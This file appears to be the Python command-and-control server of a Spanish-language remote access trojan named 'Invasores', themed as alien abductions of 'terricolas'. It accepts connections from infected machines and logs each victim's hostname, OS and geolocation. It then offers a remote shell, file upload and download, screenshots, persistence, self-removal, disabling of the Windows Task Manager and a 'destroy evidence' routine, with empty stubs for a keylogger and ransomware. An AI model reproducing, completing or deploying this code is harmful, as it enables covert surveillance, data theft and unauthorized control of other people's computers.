
# NUCLEO DE TODO INVASORES >:)
# CREADO POR KIRARI


# MODULOS DEL SISTEMA
import re
import os
import sys
import time
import socket
import pygame	

from tabulate import tabulate
from threading import Thread

from Crypto import Random
from Crypto.Cipher import AES

# MODULOS CREADOS
import utilidades.creador_ayuda as ayuda
from utilidades.banners import *
from utilidades.cadenas import chain_alien



# ----------------------------------------------------------------------------------------


# MODO LIVE PARA ABDUCCION 
EnVivo=False


def cargar_banda_sonora(musica):
	pygame.mixer.music.load(os.getcwd() + musica)
	pygame.mixer.music.play(loops=-1)
	return


def cartelAyuda():
	print("""\033[0;39m

 \033[1;31m[-] Puedes tipear 'ayuda' para ver los comandos disponibles \033[0;39m

	""")
	return

def encabezados(banner):
	os.system('clear')
	if banner=="principal":
		banner_principal()
	elif banner=="secundario":
		banner_secundario()
	elif banner=="abduccion":
		banner_abduction_menu()
	elif banner=="laboratorio":
		banner_laboratorio()
	elif banner=="manipular":
		banner_manipular()
	cartelAyuda()
	return


def desplegar_ayuda(COMANDOS,tipo):
	if tipo=="principal":
		ayuda.comandos(COMANDOS,"Comandos generales")
		ayuda.comandos_basicos('secundario')
	
	elif tipo=="abducciones":
		ayuda.comandos(COMANDOS,"Comandos abducciones")
		ayuda.comandos_basicos('secundario')

	elif tipo=="laboratorio":
		ayuda.comandos(COMANDOS,'Comandos laboratorio')
		ayuda.comandos_basicos('secundario')

	elif tipo=="manipular":
		ayuda.comandos_basicos('secundario')

	elif tipo=="cmd":
		ayuda.comandos(COMANDOS,'Comandos shell')

	return


def ataques():

	import random

	frases = [

	"Aniquilaste a victima con rayo desintegrador",
	"Perforando el ano del objetivo. La cabeza de la victima ha sido explotada",
	"Aturdiendo al individuo con rayos de electricidad",
	"Has disparado una poderosa bomba de iones sobre el terricola",
	"Has extraido el cerebro del individuo, quitandole la vida de manera rapida",
	"Lanzando gusano alienigena para devorar objetivo"
	
	]

	return random.choice(frases)


def control_ruta(path,signo):
		
	ruta = path.split(signo)
	if (ruta.pop()!=""):
		verificar_ruta = signo.join(ruta)

		if (os.path.isdir(verificar_ruta)):
			return True
		else:
			return False
	else:
		return False


# ------------------------------------------------------------------------------------------



class Server(Thread):


	# --------- CONFIGURACION DEL SERVIDOR ---------

	def __init__(self,ip="0.0.0.0",port=9000):
		super(Server, self).__init__()

		self.terricolas = []
		self.ip = ip
		self.port = int(port)

		try:

			self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

			self.server.bind((self.ip,self.port))
			self.server.listen(5)

		except socket.error as e:
			print (" Error: ",e)



	#def cifrar(self,msg,BLOCK_SIZE=32):
	#	iv = Random.new().read(BLOCK_SIZE)
	#	obj = AES.new('This is a key123', AES.MODE_CBC, iv)
	#    ciphertext = obj.encrypt(message)
	#    return ciphertext


	# --------- ENVIAR MENSAJES ---------

	def enviar(self,server,mensaje):
		server.send(bytes(mensaje,'utf-8'))
		return


	# --------- RECIBIR MENSAJES ---------

	def recibir(self,server,chunk=4096):
		raw_msg = server.recv(chunk)
		msg = (raw_msg).decode('utf-8')
		return msg


	def recibir_todo(self,server):
	
		longitud = int(self.recibir(server))

		data = []

		while(True):
			datos = self.recibir(server)
			data.append(datos)
			if (len(data)==longitud):
				break

		print('\n')
		for _ in data:
			print(_.rstrip('\n'))

		print('\n')

		return True


	# --------- OBTENER INFORMACION --------- 

	def obtener_informacion(self,client,address):
		hostname = self.recibir(client)
		self.enviar(client,"ready")
		sistema = self.recibir(client)
		self.enviar(client,"ready")
		ip_info = (self.recibir(client)).split(',')
		ciudad = ip_info[0]
		ip_public = ip_info[1]
		pais = ip_info[2]
		estado = ip_info[3]
		geolocation = {'city_name':ciudad, 'IPv4':ip_public, 'country_name':pais, 'state':estado}
		return [client,address,hostname,sistema,geolocation]



	# --------- ESCRIBIR INFORMACION --------- 

	def EscribirInformacion(self,info):
		inf = "['"+info[2]+"',"+str(info[4])+","+str(info[1][1])+"]\n"
		with open('core/abducciones/capturados.txt','a+') as archivo:
			archivo.write(inf)
		return


	# --------- ABDUCIR VICTIMAS ---------

	def run(self):

		while (True):
			try:
				conexion, address = self.server.accept()
				conexion.setblocking(1)
				client_info = self.obtener_informacion(conexion,address)
				self.terricolas.append(client_info)
				self.EscribirInformacion(client_info)
			except Exception as e:
				print(' Error al abducir a un terricola: ',e)
				continue

		return


	def VerAbducciones(self):
		# -hold en xterm es para que la ventana quede estatica y no se cierre al terminar el programa
		os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Abduccion en vivo" -e python3 core/abducciones/live.py &')
		return


	# --------- LISTAR VICTIMAS ---------

	def ver_terricolas(self,modo):

		# ["ID", "Terricola", "Pais", "Ciudad" ]
		# terricola[2],terricola[4]["country_name"],terricola[4]["city_name"]

		# ["ID", "Terricola", "Pais", "Ciudad", "Sistema Operativo" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"]
		# terricola[2],terricola[4]["country_name"],terricola[4]["city_name"],terricola[3],terricola[1][0],terricola[4]["IPv4"],terricola[1][1]

		lista_terricolas_table = []

		if (modo=="abduccion"):
			encabezados = ["ID", "Terricola", "Pais", "Ciudad" ]

			for terricola in self.terricolas:
				lista_terricolas_table.append([terricola[2],terricola[4]["country_name"],terricola[4]["city_name"]])

		elif (modo=="laboratorio"):
			encabezados = ["ID", "Terricola", "Pais", "Ciudad", "Sistema Operativo" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"]

			for terricola in self.terricolas:
				lista_terricolas_table.append([terricola[2],terricola[4]["country_name"],terricola[4]["city_name"],terricola[3],terricola[1][0],terricola[4]["IPv4"],terricola[1][1]])


		if(len(self.terricolas)>0):
			print ("\n \033[1;34mLista de personas secuestradas\033[0;39m\n")
			index = [i for i in range(1,len(self.terricolas)+1)]
			print (tabulate(lista_terricolas_table, tablefmt="fancy_grid", headers=encabezados, showindex=index),"\n\n")

		else:
		 	print("\n [\033[1;31mx\033[0;39m] No hay personas capturadas\n")

		return 



	# --------- REMOVER REGISTRO DE VICTIMA -------------

	def remover_terricola(self,client):
		return self.terricolas.pop(client)	



	# --------- MATAR A UN SECUESTRADO ESPECIFICO -------------
	
	def matar_terricola(self,client):

		self.enviar(self.terricolas[client][0],"matar")
		self.remover_terricola(client)
		return




	# --------- MATAR A TODAS LAS VICTIMAS CAPTURADAS ---------

	def matar_terricolas(self):

		if(len(self.terricolas)>0):
			print(" \n [\033[1;34m*\033[0;39m] Preparandote para acabar con los individuos...\n")
			time.sleep(2)

			for terricola in self.terricolas:
				print(" [\033[1;34m*\033[0;39m] Matando a terricola " + terricola[2])
				print(" [\033[1;34m*\033[0;39m] " + ataques())
				
				self.enviar(terricola[0],'matar')
				time.sleep(0.5)

			self.terricolas.clear()
			print("\n [!] Ha eliminado a todos los secuestrados!\n\n")
		
		else:
			print(" \n [\033[1;31mx\033[0;39m] No hay terricolas\n")

		return


	# --------- DETENER SERVIDOR ---------

	def destruir_evidencias(self):
		for terricola in self.terricolas:
			self.enviar(terricola[0],"matar")
			time.sleep(0.5)
		
		self.terricolas.clear()
		return


	def detener(self):
		self.destruir_evidencias()
		#self.server.shutdown(socket.SHUT_RDWR)
		self.server.close()
		return



# -----------------------------------------------------------------------------------------

class Control():

	def __init__(self,servidor,client):
		self.servidor = servidor
		self.objetivo = servidor.terricolas[client][0]
		self.hostname = servidor.terricolas[client][2]


	# MODULOS EXTRAS

	def run_cmd(self):
		
		COMANDOS = {

		"{detener|exit}" : ["stop","Detiene temporalmente a la victima"]

		}

		self.servidor.enviar(self.objetivo,"cmd")

		sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")

		while(True):
			try:

				if(sesion!=""):
					if("cd " in sesion):
						self.servidor.enviar(self.objetivo,sesion)
						location = self.servidor.recibir(self.objetivo)
						print(location)

					elif (sesion=="detener") or (sesion=="exit"):
						self.servidor.enviar(self.objetivo,sesion)
						t = self.servidor.recibir(self.objetivo)
						print(t)
						break

					elif (sesion=="ayuda"):
						desplegar_ayuda(COMANDOS,'cmd')

					else:
						self.servidor.enviar(self.objetivo,sesion)
						self.servidor.recibir_todo(self.objetivo)


				sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")

			except Exception as e:
				print(" Error de comunicacion con vicitma: ",e)
				break

		return


	def deshabilitar_TaskManager(self):

		self.servidor.enviar(self.objetivo,"taskManagerDisable")
		self.servidor.recibir(self.objetivo)
		time.sleep(0.01)

		# Envia a cliente que se deshabilite el Tmgr
		self.servidor.enviar(self.objetivo,"task_disable")
		msg = self.servidor.recibir(self.objetivo)
		print(msg)
		return


	def netcat(self):
		#servidor.enviar(servidor.terricolas[client][0],"netcat")
		#os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Victima Netcat" -e nc -lp 9001 &')
		return (" Modulo en desarrollo")

	def persistencia(self):

		self.servidor.enviar(self.objetivo,"persistencia")
		msg = self.servidor.recibir(self.objetivo)
		print (msg)
		return


	def autoremoverse(self):

		self.servidor.enviar(self.objetivo,"autoremover")
		msg = self.servidor.recibir(self.objetivo)
		print (msg)
		return


	def keylogger(self):
		return


	def screenshot(self):

		# Envia y recibe mensaje del modo a utilizar
		self.servidor.enviar(self.objetivo,"screenshot")
		self.servidor.recibir(self.objetivo)

		if not os.path.isdir("screenshots"):
			os.mkdir("screenshots")

		self.servidor.enviar(self.objetivo,"nombre")
		nombre_archivo = self.servidor.recibir(self.objetivo)


		if (nombre_archivo!="failed"):

			self.servidor.enviar(self.objetivo,'size')
			size = int(self.servidor.recibir(self.objetivo))

			with open("screenshots/"+nombre_archivo,"wb") as archivo:
				while (size>0):
					contenido = self.objetivo.recv(1024)
					archivo.write(contenido)
					size-=len(contenido)


			print (" [\033[1;32m+\033[0;39m] La captura se guardo en: screenshots/"+nombre_archivo)

		else:
			print (" [\033[1;31mx\033[0;39m] No se pudo capturar la imagen debido a la incompatibilidad.")


		return


	def grabarAudio(self):
		return


	def ransomware(self):
		return


	def subir_archivos(self,subida):

		#cambio = (cambio.replace('subir ','')).split()
		
		if ("subir" in subida):
			
			if (subida=="subir"):
				print (" Utilice 'subir <Ruta origen> <Ruta destino>'")
				return

			elif (re.match("subir(\d|\w)",subida)):
				print('\n [\033[1;31mx\033[0;39m] Comando "'+subida+'" no encontrado.\n')
				return

			else:
				subida = (subida.replace('subir','')).split()
				if (len(subida)<2):
					print (" [\033[1;31mx\033[0;39m] Faltan argumentos...")
					return False

				elif (len(subida)>2):
					print (" [\033[1;31mx\033[0;39m] Hay demasiados argumentos...")
					return False

		else:
			return False


		if (len(subida)==2):
			if (control_ruta(subida[0],"/")):
				if (os.path.exists(subida[0])):
					pass
				else:
					print (" [\033[1;31mx\033[0;39m] El archivo que quieres subir no existe.")
					return False
			else:
				print (" [\033[1;31mx\033[0;39m] Ruta origen no existe o no se especifico archivo.")
				return False

		origen = subida[0]
		destino = subida[1] 

		# Envia modo de uso y recibe el 'ok'
		self.servidor.enviar(self.objetivo,"subir")
		self.servidor.recibir(self.objetivo)

		# Envia el destino donde se va a guardar el archivo
		self.servidor.enviar(self.objetivo,destino)
		respuesta = self.servidor.recibir(self.objetivo)
		time.sleep(0.1)

		if (respuesta=="ok"):

			self.servidor.enviar(self.objetivo,str(os.path.getsize(origen)))
			self.servidor.recibir(self.objetivo)
			time.sleep(1)

			# Se prepara para el envio de datos del archivo
			with open(origen, "rb") as archivo_origen:
					contenido = archivo_origen.read(1024)
					while contenido:
						self.objetivo.sendall(contenido)
						contenido = archivo_origen.read(1024)

			print(" [\033[1;32m+\033[0;39m] El archivo se subio correctamente.")    

		elif (respuesta=="directorio"):
			print (" [\033[1;31mx\033[0;39m] Ruta destino es un directorio.")

		else:
			print (" [\033[1;31mx\033[0;39m] Ruta destino no existe o no se especifico nombre de nuevo archivo.")

		return



	def descargar_archivos(self,bajada):

		if ("descargar" in bajada):
			
			if (bajada=="descargar"):
				print (" Utilice 'descargar <Ruta origen> <Ruta destino>'")
				return

			elif (re.match("descargar(\d|\w)",bajada)):
				print('\n [\033[1;31mx\033[0;39m] Comando "'+bajada+'" no encontrado.\n')
				return

			else:
				bajada = (bajada.replace('descargar','')).split()
				
				if (len(bajada)<2):
					print (" [\033[1;31mx\033[0;39m] Faltan argumentos...")
					return False

				elif (len(bajada)>2):
					print (" [\033[1;31mx\033[0;39m] Hay demasiados argumentos...")
					return False

		else:
			return False



		if (len(bajada)==2):
			
			if os.path.isdir(bajada[1]):
				print (" [\033[1;31mx\033[0;39m] Ruta destino es un directorio.")
				return False

			if (control_ruta(bajada[1],"/")):
				pass

			else:
				print (" [\033[1;31mx\033[0;39m] Ruta destino no existe o no se especifico nombre de nuevo archivo.")
				return False


		origen = bajada[0]
		destino = bajada[1] 

		# Envia modo de uso y recibe el 'ok'
		self.servidor.enviar(self.objetivo,"descargar")
		self.servidor.recibir(self.objetivo)


		# Envia ruta a descargar
		self.servidor.enviar(self.objetivo,bajada[0])
		time.sleep(0.1)

		size = int(self.servidor.recibir(self.objetivo))

		if (size!=-1):
			
			self.servidor.enviar(self.objetivo,"ok")

			#print(size)

			# Abre el archivo nuevo 
			with open(destino, "wb") as archivo_destino:
				#contenido = self.client.recv(1024)
				#print(os.path.getsize(destino))
				while (size>0):
					contenido = self.objetivo.recv(1024)
					archivo_destino.write(contenido)
					size-=len(contenido)
					#print(size)

			print(" [\033[1;32m+\033[0;39m] El archivo se descargo correctamente.")   

		else:
			print (" [\033[1;31mx\033[0;39m] Ruta origen no existe o no se especifico archivo.")
			
		return


	# MODULOS PARA COMANDOS EXCEPCIONALES DEL SISTEMA VICTIMA

	def ls(self):
		self.servidor.enviar(self.objetivo,"ls")
		self.servidor.recibir_todo(self.objetivo)

	def pwd(self):
		self.servidor.enviar(self.objetivo,"pwd")
		self.servidor.recibir_todo(self.objetivo)
		return

	def cd(self,ruta):
		if ("cd" in ruta):
			
			if (ruta=="cd"):
				print (" Utilice 'cd <ruta>'")
				return

			elif (re.match("cd(\d|\w)",ruta)):
				print('\n [\033[1;31mx\033[0;39m] Comando "'+ruta+'" no encontrado.\n')
				return

		else:
			return False

		self.servidor.enviar(self.objetivo,ruta)
		location = self.servidor.recibir(self.objetivo)
		print(location)
		return



	# MODULOS PARA COMANDOS RED

	def ifconfig(self):
		print ("\n Configuraciones de red de la victima")
		print (" ====================================")
		self.servidor.enviar(self.objetivo,"ifconfig")
		self.servidor.recibir_todo(self.objetivo)
		return



# --------------------- MENUS --------------------------------------------

def manipular(servidor,cliente):

	COMANDOS_EXTRA = {

	"cmd" : ["shell","Ejecutar shell"],
	"netcat" : ["netcat","Utiliza netcat para obtener un shell inversa"],
	"persistencia" : ["persistence","Implantar bicho en el cerebro victima"],
	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"],
	"screenshot" : ["screenshot","Saca una captura de pantalla del equipo victima"],
	"taskmgr_disable" : ["taskmgr_disable","Deshabilita el administrador de tareas de Windows"]

	}

	COMANDOS_SISTEMA = {

	"ls" : ["ls","Listar directorios de la carpeta actual"],
	"pwd" : ["pwd","Ver posicion actual"],
	"cd <directorio>" : ["cd","Cambiar de directorio"]

	}


	COMANDOS_RED = {

	"ifconfig" : ["upload","Ver configuraciones de red de la victima"]

	}


	COMANDOS_ARCHIVOS = {

	"subir" : ["upload","Subir archivo a equipo remoto"],
	"descargar" : ["download","Descargar archivo de equipo remoto"]

	}



	encabezados('manipular')

	control = Control(servidor,cliente)
	
	victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m")).strip()

	while (victima!="volver"):

		# MODULOS EXTRA

		if (victima=="cmd"):
			control.run_cmd()
			encabezados('manipular')
		
		elif (victima=="netcat"):
			os.system('clear')
			banner_manipular()
			control.netcat()
			encabezados('manipular')

		elif (victima=="persistencia"):
			control.persistencia()

		elif (victima=="autoremover"):
			control.autoremoverse()

		elif (victima=="screenshot"):
			control.screenshot()

		elif (victima=="taskmgr_disable"):
			control.deshabilitar_TaskManager()

		# MODULOS ARCHIVOS

		elif ("subir" in victima):
			control.subir_archivos(victima)
 
		elif ("descargar" in victima):
			control.descargar_archivos(victima)

		# MODULOS DE RED

		elif (victima=="ifconfig"):
			control.ifconfig()


		# MODULOS DE COMANDOS DE SISTEMA

		elif (victima=="pwd"):
			control.pwd()

		elif (victima=="ls"):
			control.ls()

		elif ("cd" in victima):
			control.cd(victima)

		# MODULOS BASICOS

		elif (victima=="ayuda"):
			ayuda.comandos(COMANDOS_EXTRA,"Comandos extra")
			ayuda.comandos(COMANDOS_ARCHIVOS,"Comandos de archivos")
			ayuda.comandos(COMANDOS_RED,"Comandos de red")
			ayuda.comandos(COMANDOS_SISTEMA,"Comandos del sistema")
			ayuda.comandos_basicos("secundario")


		elif (victima=="limpiar"):
			encabezados('manipular')

		elif (victima==""):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "'+victima+'" no encontrado.\n')

		victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m")).strip()

	return


def laboratorio(servidor):

	COMANDOS = {

	"manipular <id>" : ["Manipulation","Controlar a un individuo especifico"],
	"matar <id>" : ["Kill","Sirve para asesinar al terricola"],
	"listar": ["List","Lista a las personas comprometidas de manera interactiva"],

	}


	encabezados("laboratorio")

	print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")

	prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).strip()

	while(prompt_laboratorio!="volver"):

		if ('manipular' in prompt_laboratorio):
			if (prompt_laboratorio=="manipular"):
				print(" Utilice 'manipular <id>'")
			elif (re.match("manipular(\d|\w)",prompt_laboratorio)):
				print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
			else:
				try:
					cliente = int(prompt_laboratorio.replace('manipular', ''))-1

					if (cliente < len(servidor.terricolas)) and (cliente>=0):
						manipular(servidor,cliente)
						encabezados("laboratorio")
						print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
					else:
						print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");

				except ValueError as e:
					#print(e)
					print (" \n [\033[1;31mx\033[0;39m] Error al manipular a victima. Utilice 'manipular <id>'\n");

		elif ('matar' in prompt_laboratorio):
			if (prompt_laboratorio=="matar"):
				print(" Utilice 'matar <id>'")
			elif (re.match("matar(\d|\w)",prompt_laboratorio)):
				print('\n [\033[1;31mx\033[0;39m] Comando "', prompt_laboratorio, '" no encontrado.\n')
			else:
				try:
					cliente = int(prompt_laboratorio.replace('matar', ''))-1
					
					if (cliente < len(servidor.terricolas)) and (cliente>=0):
						servidor.matar_terricola(cliente)
						print("\n [\033[1;34m*\033[0;39m] " + ataques() + "\n")
					else:
						print (" \n [\033[1;31mx\033[0;39m] No existe el terricola indicado...\n");

				except ValueError:
					print (" \n [\033[1;31mx\033[0;39m] Error al matar a victima. Utilice 'matar <id>'\n");

		elif (prompt_laboratorio=="listar"):
			servidor.ver_terricolas("laboratorio")

		elif (prompt_laboratorio=="ayuda"):
			desplegar_ayuda(COMANDOS,'laboratorio')

		elif (prompt_laboratorio=="limpiar"):
			encabezados('laboratorio')

		elif (prompt_laboratorio==""):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "'+ prompt_laboratorio+ '" no encontrado.\n')


		prompt_laboratorio = (input(" \033[0;39mInvasores (\033[0;31mLaboratorio\033[0;39m) --> \033[0;39m").lower()).strip()

	return


def AbduccionEnVivo(servidor):
	global EnVivo

	if (EnVivo==False):
		EnVivo=True
		servidor.VerAbducciones()
	else:
		print(" Modo abduccion en vivo: activo")
		activar = (input(" El modo abduccion en vivo se encuentra activa. Desea apagarla? (s/n): ")).lower()
		while (activar!="s") and (activar!="n"):
			print(" Opcion inexistente... Intente nuevamente...")
			activar = (input(" El modo abduccion en vivo se encuentra activa. Desea apagarla? (s/n): ")).lower()
		if (activar=="s"):
			os.system('pkill -9 -f xterm')
			EnVivo=False
			print(" Modo abduccion en vivo: desactivado")
			time.sleep(2.5)
	return


def abducciones_menu(servidor):

	COMANDOS = {

	"live" : ["live","Permite ver el proceso de abduccion en modo real"],
	"abducidos" : ["Abducted","Lista todas las personas secuestradas"],

	}
	
	pygame.init()
	cargar_banda_sonora("/core/musica/abduction.mp3")

	encabezados("abduccion")

	selector = (input(" \033[0;39mInvasores (\033[0;31mAbducciones\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	while (selector!='volver'):

		if (selector=='live'):
			AbduccionEnVivo(servidor)
			encabezados("abduccion")

		elif (selector=='abducidos'):
			servidor.ver_terricolas("abduccion")

		elif (selector=='ayuda'):
			desplegar_ayuda(COMANDOS,"abducciones")

		elif (selector=='limpiar'):
			encabezados('abduccion')

		elif(selector == ''):
			pass

		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "'+ selector + '" no encontrado.\n')

		selector = (input(" \033[0;39mInvasores (\033[0;31mAbducciones\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	return


def menu():

	COMANDOS = {

	"abducir" : ["Abduct","Acceder al menu de abducciones"],
	"laboratorio" : ["Laboratory","Acceder al laboratorio"],
	"destruirlos" : ["Massive Destruction","Destruye a todos los individuos comprometidos"]

	}

	servidor = Server()
	servidor.setDaemon(True)
	servidor.start()

	pygame.init()
	cargar_banda_sonora("/core/musica/laboratory.mp3")

	encabezados("secundario")

	opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	while(opcion!="volver"):

		if(opcion=="abducir"):
			abducciones_menu(servidor)
			cargar_banda_sonora("/core/musica/laboratory.mp3")
			encabezados("secundario")
		elif(opcion=="laboratorio"):
			laboratorio(servidor)
			encabezados("secundario")
		elif(opcion=="destruirlos"):
			servidor.matar_terricolas()
		elif(opcion=="ayuda"):
			desplegar_ayuda(COMANDOS,"principal")	
		elif(opcion=="limpiar"):
			encabezados("secundario")
		elif(opcion==''):
			pass
		else:
			print('\n [\033[1;31mx\033[0;39m] Comando "' + opcion + '" no encontrado.\n')


		opcion = (input(" \033[0;39mInvasores (\033[0;31mPrincipal\033[0;39m) --> \033[0;39m").lower()).replace(" ","")

	os.system('pkill -9 -f xterm')
	os.system('clear')
	servidor.detener()

	return


if __name__ == '__main__':
	menu()
